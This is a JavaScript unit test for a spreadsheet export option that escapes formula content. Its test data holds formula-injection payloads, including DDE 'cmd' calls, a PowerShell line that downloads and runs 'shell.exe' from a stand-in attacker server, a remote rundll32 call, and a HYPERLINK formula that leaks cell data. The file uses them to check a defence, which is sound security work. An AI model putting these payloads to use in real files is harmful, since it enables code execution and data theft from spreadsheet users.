...
QUnit.module('encodeExecutableContent option', moduleConfig, () => {
    QUnit.test('All executable cell content should be encoded if encodeExecutableContent = true', function(assert) {
        ...
        const dataSource = [
            { value: '=test', expected: { excelCell: { value: '"\'=test"', numberFormat: '@' } } },
            { value: '="test"', expected: { excelCell: { value: '"\'=""test"""', numberFormat: '@' } } },
            { value: '="test ', expected: { excelCell: { value: '"\'=""test "', numberFormat: '@' } } },
            { value: '=cmd|\' /C calc\'!A1', expected: { excelCell: { value: '"\'=cmd|\' /C calc\'!A1"', numberFormat: '@' } } },
            { value: '5', expected: { excelCell: { value: '5' } } },
            { value: '"5"', expected: { excelCell: { value: '"5"' } } },
            { value: '+5', expected: { excelCell: { value: '+5', numberFormat: '@' } } },
            { value: '"+5"', expected: { excelCell: { value: '"+5"' } } },
            { value: '-5', expected: { excelCell: { value: '-5', numberFormat: '@' } } },
            { value: '"-5"', expected: { excelCell: { value: '"-5"' } } },
            { value: '5.5', expected: { excelCell: { value: '5.5' } } },
            { value: '"5.5"', expected: { excelCell: { value: '"5.5"' } } },
            { value: '-5.5', expected: { excelCell: { value: '-5.5', numberFormat: '@' } } },
            { value: '"-5.5"', expected: { excelCell: { value: '"-5.5"' } } },
            { value: '+5.5', expected: { excelCell: { value: '+5.5', numberFormat: '@' } } },
            { value: '"+5.5"', expected: { excelCell: { value: '"+5.5"' } } },
            { value: '=5', expected: { excelCell: { value: '"\'=5"', numberFormat: '@' } } },
            ...
            { value: '@5', expected: { excelCell: { value: '"\'@5"', numberFormat: '@' } } },
            { value: '"@5"', expected: { excelCell: { value: '"\'@5"' } } },
            { value: '=2+5', expected: { excelCell: { value: '"\'=2+5"', numberFormat: '@' } } },
            { value: '"=2+5"', expected: { excelCell: { value: '"\'=2+5"' } } },
            { value: '+2+5', expected: { excelCell: { value: '"\'+2+5"', numberFormat: '@' } } },
            { value: '"+2+5"', expected: { excelCell: { value: '"\'+2+5"' } } },
            { value: '-2+5', expected: { excelCell: { value: '"\'-2+5"', numberFormat: '@' } } },
            { value: '"-2+5"', expected: { excelCell: { value: '"\'-2+5"' } } },
            { value: '+', expected: { excelCell: { value: '+', numberFormat: '@' } } },
            ...
            { value: '"="', expected: { excelCell: { value: '"="' } } },
            { value: '@', expected: { excelCell: { value: '@', numberFormat: '@' } } },
            { value: '@MyData"Column', expected: { excelCell: { value: '"\'@MyData""Column"', numberFormat: '@' } } },
            { value: '"@"', expected: { excelCell: { value: '"@"' } } },
            { value: '=1+2";=1+2', expected: { excelCell: { value: '"\'=1+2"";=1+2"', numberFormat: '@' } } },
            { value: '=1+2\'" ;,=1+2', expected: { excelCell: { value: '"\'=1+2\'"" ;,=1+2"', numberFormat: '@' } } },
            { value: '=CONCATENATE("1","2")', expected: { excelCell: { value: '"\'=CONCATENATE(""1"",""2"")"', numberFormat: '@' } } },
            ...
            { value: '=DDE ("cmd";"/C calc";"!A0")A0', expected: { excelCell: { value: '"\'=DDE (""cmd"";""/C calc"";""!A0"")A0"', numberFormat: '@' } } },
            { value: '@SUM(1+9)*cmd|\' /C calc\'!A0', expected: { excelCell: { value: '"\'@SUM(1+9)*cmd|\' /C calc\'!A0"', numberFormat: '@' } } },
            { value: '=10+20+cmd|\' /C calc\'!A0\'', expected: { excelCell: { value: '"\'=10+20+cmd|\' /C calc\'!A0\'"', numberFormat: '@' } } },
            { value: '=cmd|\' /C notepad\'!\'A1\'', expected: { excelCell: { value: '"\'=cmd|\' /C notepad\'!\'A1\'"', numberFormat: '@' } } },
            { value: '=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'', expected: { excelCell: { value: '"\'=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'"', numberFormat: '@' } } },
            { value: '=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1', expected: { excelCell: { value: '"\'=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1"', numberFormat: '@' } } },
            { value: '=HYPERLINK("http://example.com?leak="&A1&A2,"Error: please click for further information")', expected: { excelCell: { value: '"\'=HYPERLINK(""http://example.com?leak=""&A1&A2,""Error: please click for further information"")"', numberFormat: '@' } } },
        ];
